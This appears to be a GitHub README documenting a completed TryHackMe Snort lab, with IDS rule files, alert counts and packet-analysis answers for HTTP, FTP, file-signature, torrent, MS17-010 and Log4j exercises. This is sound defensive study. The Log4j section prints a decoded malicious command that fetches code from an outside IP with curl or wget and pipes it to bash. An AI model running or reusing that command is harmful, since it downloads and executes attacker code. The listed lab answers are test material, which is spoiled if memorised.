# Snort Challenge – The Basics

Hands-on IDS rule writing and packet analysis completed while working through TryHackMe's **Snort Challenge – The Basics** room.

> This repository is for defensive-security learning in an authorized lab environment. PCAP files from the training platform are not redistributed here.

## What I practiced

- Writing Snort IDS rules for HTTP and FTP traffic
- Matching file signatures for PNG and GIF files
- Detecting torrent metafiles in packet payloads
- Troubleshooting Snort rule syntax and logic errors
- Using external rules to investigate MS17-010 activity
- Detecting Log4j exploitation indicators
- Inspecting Snort alert/log output and packet metadata
- Using `content`, hexadecimal payload matching, `dsize`, SIDs, and bidirectional rules

## Repository structure

```text
snort-challenge-the-basics/
├── README.md
└── rules/
    ├── http.rules
    ├── ftp.rules
    ├── file-signatures.rules
    ├── torrent.rules
    ├── ms17-010.rules
    └── log4j.rules
```

Each rule set is separated by use case so the repository can be reused as a small detection-engineering reference.

## Environment

Typical command structure used throughout the lab:

```bash
sudo snort -c local.rules -r capture.pcap -A console
```

For full alert output and local logging:

```bash
sudo snort -c local.rules -A full -l . -r capture.pcap
```

## Rule files

- [`rules/http.rules`](rules/http.rules) – detect TCP traffic to or from port 80
- [`rules/ftp.rules`](rules/ftp.rules) – FTP traffic and login-state detection
- [`rules/file-signatures.rules`](rules/file-signatures.rules) – PNG and GIF magic-byte detection
- [`rules/torrent.rules`](rules/torrent.rules) – torrent metafile payload detection
- [`rules/ms17-010.rules`](rules/ms17-010.rules) – SMB `\IPC$` indicator detection
- [`rules/log4j.rules`](rules/log4j.rules) – payload-size filtering used during Log4j investigation

## 1. HTTP traffic

Observed alert count: **164**.

Packet-analysis findings:
- Packet 63 destination IP: `216.239.59.99`
- Packet 64 ACK: `0x2E6B5384`
- Packet 62 SEQ: `0x36C21E28`
- Packet 65 TTL: `128`
- Packet 65 source IP: `145.254.160.237`
- Packet 65 source port: `3372`

Rule: [`rules/http.rules`](rules/http.rules)

## 2. FTP traffic

Observed alert count for all port 21 traffic: **614**.

FTP service identified: **Microsoft FTP Service**.

Additional lab results:
- Failed login attempts: **41**
- Successful logins: **1**
- Valid username, password required: **42**
- Administrator username, password required: **7**

Rule set: [`rules/ftp.rules`](rules/ftp.rules)

## 3. PNG and GIF detection

PNG magic bytes:

```text
89 50 4E 47 0D 0A 1A 0A
```

Embedded software identified in the PNG packet: **Adobe ImageReady**.

GIF format identified: **GIF89a**.

Rule set: [`rules/file-signatures.rules`](rules/file-signatures.rules)

## 4. Torrent metafile detection

Observed alert count: **2**.

Findings:
- Application: `bittorrent`
- MIME type: `application/x-bittorrent`
- Hostname: `tracker2.torrentbox.com`

Rule: [`rules/torrent.rules`](rules/torrent.rules)

## 5. Troubleshooting Snort rules

Results after fixing each rule file:

| Rule file | Result |
|---|---:|
| `local-1.rules` | 16 |
| `local-2.rules` | 68 |
| `local-3.rules` | 87 |
| `local-4.rules` | 90 |
| `local-5.rules` | 155 |
| `local-6.rules` | 2 |
| `local-7.rules` | `msg` |

Key troubleshooting lessons included duplicate SIDs, missing rule-header fields, incorrect separators, invalid direction operators, case-sensitive payload matching, and missing `msg` options.

## 6. MS17-010 investigation

Supplied external rules produced **25,154 alerts**.

The custom `\IPC$` detection rule produced **12 alerts**.

Requested path:

```text
\\192.168.116.138\IPC$
```

CVSS v2 score used in the lab: **9.3**.

Rule: [`rules/ms17-010.rules`](rules/ms17-010.rules)

## 7. Log4j investigation

Supplied rules produced **26 alerts** and **4 unique triggered rules**.

First six SID digits:

```text
210037
```

The payload-size rule produced **41 alerts**.

Findings:
- Encoding algorithm: **Base64**
- IP ID: **62808**

Decoded command observed in the malicious payload:

```text
(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash
```

Documented for analysis only; do not execute it.

CVSS v2 score used in the lab: **9.3**.

Rule: [`rules/log4j.rules`](rules/log4j.rules)

## Skills demonstrated

`Snort` · `IDS` · `Network Security` · `Packet Analysis` · `PCAP Analysis` · `Detection Engineering` · `HTTP` · `FTP` · `SMB` · `Log4j` · `MS17-010`
